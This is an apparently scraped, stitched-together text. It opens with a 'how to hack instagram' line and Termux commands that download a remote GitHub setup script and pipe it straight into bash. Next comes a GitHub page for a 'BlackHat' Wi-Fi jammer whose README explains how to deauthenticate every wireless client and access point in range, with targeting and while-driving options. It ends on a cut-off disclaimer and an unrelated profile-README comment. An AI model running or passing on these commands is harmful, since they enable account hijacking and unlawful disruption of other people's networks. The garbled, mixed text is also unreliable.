 how to hack instagram .
 pkg install git
 pkg install wget
 pkg install php
 pkg install openssh
 wget-qO-
 https://github.com/bhikandeshmukh/
 shark/raw/master/setup |
 bash ]"

 
Code
Issues
2
Wi-Fi-Jammer Using Python Script As BlackHat

License
 View license
 77 stars
 7 forks
 1 watching
 1 Branch
 0 Tags
 Activity
Public repository
bhikandeshmukh/Wi-Fi-Jammer
Folders and files
Name	
Latest commit
author
aladdin
4 years ago
History
res
4 years ago
Licence
4 years ago
README.md
4 years ago
wifijammer.py
4 years ago
Repository files navigation
README
License
Built With Love



Wi-Fi Jammer

Open Source GitHub version Stars

wifijammer
Continuously jam all wifi clients and access points within range. The effectiveness of this script is constrained by your wireless card. Alfa cards seem to effectively jam within about a block radius with heavy access point saturation. Granularity is given in the options for more effective targeting.

Requires:
python 2.7, python-scapy, a wireless card capable of injection

Usage
Simple
$ git clone https://github.com/bhikandeshmukh/Wi-Fi-Jammer.git
$ cd Wi-Fi-Jammer
$ python wifijammer.py
This will find the most powerful wireless interface and turn on monitor mode. If a monitor mode interface is already up it will use the first one it finds instead. It will then start sequentially hopping channels 1 per second from channel 1 to 11 identifying all access points and clients connected to those access points. On the first pass through all the wireless channels it is only identifying targets. After that the 1sec per channel time limit is eliminated and channels are hopped as soon as the deauth packets finish sending. Note that it will still add clients and APs as it finds them after the first pass through.

Upon hopping to a new channel it will identify targets that are on that channel and send 1 deauth packet to the client from the AP, 1 deauth to the AP from the client, and 1 deauth to the AP destined for the broadcast address to deauth all clients connected to the AP. Many APs ignore deauths to broadcast addresses.

python wifijammer.py -a 00:0E:DA:DE:24:8E -c 2
Deauthenticate all devices with which 00:0E:DA:DE:24:8E communicates and skips channel hopping by setting the channel to the target AP's channel (2 in this case). This would mainly be an access point's MAC so all clients associated with that AP would be deauthenticated, but you can also put a client MAC here to target that one client and any other devices that communicate with it.

Advanced
python wifijammer.py -c 1 -p 5 -t .00001 -s DL:3D:8D:JJ:39:52 -d --world
-c, Set the monitor mode interface to only listen and deauth clients or APs on channel 1

-p, Send 5 packets to the client from the AP and 5 packets to the AP from the client along with 5 packets to the broadcast address of the AP

-t, Set a time interval of .00001 seconds between sending each deauth (try this if you get a scapy error like 'no buffer space')

-s, Do not deauth the MAC DL:3D:8D:JJ:39:52. Ignoring a certain MAC address is handy in case you want to tempt people to join your access point in cases of wanting to use LANs.py or a Pineapple on them.

-d, Do not send deauths to access points' broadcast address; this will speed up the deauths to the clients that are found

--world, Set the max channel to 13. In N. America the max channel standard is 11, but the rest of the world uses 13 channels so use this option if you're not in N. America

Walking/driving around
python wifijammer.py -m 10
The -m option sets a max number of client/AP combos that the script will attempt to deauth. When the max number is reached, it clears and repopulates its list based on what traffic it sniffs in the area. This allows you to constantly update the deauth list with client/AP combos who have the strongest signal in case you were not stationary. If you want to set a max and not have the deauth list clear itself when the max is hit, just add the -n option like: -m 10 -n

All options:

python wifijammer.py [-a AP MAC] [-c CHANNEL] [-d] [-i INTERFACE] [-m MAXIMUM] [-n] [-p PACKETS] [-s SKIP] [-t TIME INTERVAL]
Legal Disclaimer:
Usage of Wi-Fi jammer for at.)

<!---
ajmeena45/ajmeena45 is a ✨ special ✨ repository because its `README.md` (this file) appears on your GitHub profile.
You can click the Preview link to take a look at your changes.
--->
